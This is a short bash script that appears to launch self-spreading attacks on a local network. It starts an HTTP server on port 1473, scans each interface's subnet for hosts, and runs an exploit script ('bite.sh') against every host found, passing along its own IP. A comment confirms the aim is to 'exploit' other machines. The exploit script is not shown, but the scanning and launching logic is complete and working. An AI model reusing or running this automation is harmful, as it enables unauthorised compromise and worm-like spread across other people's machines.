#!/bin/bash

#sudo arp-scan --localnet | tail -n +3 | head -n -3 | awk '{print$1}' > possibilities.txt
sudo python -u -m SimpleHTTPServer 1473 & #</dev/null >/dev/null 2>&1 &)
sleep 3
for i in {0..9}
do
  domain=$(ip a | grep -A1 eth$i | grep inet | awk '{print$2}' | cut -d"/" -f1 | cut -d"." -f1,2,3 | grep -v :)
  if [[ "$domain" != "" ]]
  then
    sudo ./networkscan "$domain" > possibilities.txt

    input="possibilities.txt"
    myIP=$(ip a | grep -A1 eth$i | grep inet | awk '{print$2}' | cut -d"/" -f1 | grep -v :)

    while IFS= read -r line
    do
      if [[ "$myIP" != "$line" && "$line" != 192.168.119.130 ]] #edit this IP to your own so that it doesn't unnecessarily attempt to exploit you
      then
        ((./bite.sh "$line" "$myIP") & );sudo sleep 30 && kill $(ps | grep bite | awk '{print$1}');
      fi
    done < "$input"
  fi
done
#sleep 3 && sudo killall python
